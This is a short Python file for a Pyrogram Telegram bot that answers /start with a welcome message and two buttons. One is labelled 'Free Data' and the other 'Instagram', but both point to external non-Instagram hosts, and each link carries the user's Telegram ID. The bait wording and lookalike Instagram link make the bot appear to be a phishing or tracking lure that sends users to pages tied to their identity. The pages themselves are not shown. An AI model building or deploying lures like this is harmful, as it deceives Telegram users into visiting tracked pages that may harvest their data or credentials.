import os
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

app = Client("bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.private & filters.command("start"))
async def start_command(client, message):
    user_id = message.from_user.id

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📡 Free Data", url=f"https://trail-charm-waterlily.glitch.me/?id={user_id}")],
        [InlineKeyboardButton("📷 Instagram", url=f"https://trail-charm-waterlilyaha.me/?id={user_id}")]
    ])
    
    await message.reply_text(
        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐁𝐨𝐭! 🔥\n\n"
        "🛜 𝐂𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐛𝐞𝐥𝐨𝐰 𝐭𝐨 𝐚𝐜𝐜𝐞𝐬𝐬 𝐅𝐫𝐞𝐞 𝐃𝐚𝐭𝐚 𝐨𝐫 𝐜𝐡𝐞𝐜𝐤 𝐨𝐮𝐭 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦!",
        reply_markup=keyboard,
        parse_mode=enums.ParseMode.HTML
    )

if __name__ == "__main__":
    app.run()